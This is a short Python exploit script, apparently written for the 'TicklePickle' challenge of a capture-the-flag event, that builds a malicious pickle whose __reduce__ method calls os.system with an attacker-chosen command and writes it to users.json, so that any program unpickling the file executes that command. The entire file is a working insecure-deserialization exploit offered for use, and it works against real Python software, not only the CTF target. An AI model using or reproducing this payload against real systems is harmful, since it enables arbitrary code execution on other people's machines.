import os
import pickle
import argparse

class Exploit:
    def __init__ (self, command):
        self.command = command

    def __reduce__ (self):
        return (os.system, (self.command, ), )

def exploit ():
    parser = argparse.ArgumentParser('Exploit for TicklePickle Sainya Ranakshetram CTF')
    parser.add_argument('--command', help = 'Command to execute by attacker on client\'s machine', required = True, type = str)

    args = parser.parse_args()

    with open('users.json', 'wb') as file:
        pickled = pickle.dumps(Exploit(args.command))
        file.write(pickled)

if __name__ == '__main__':
    exploit()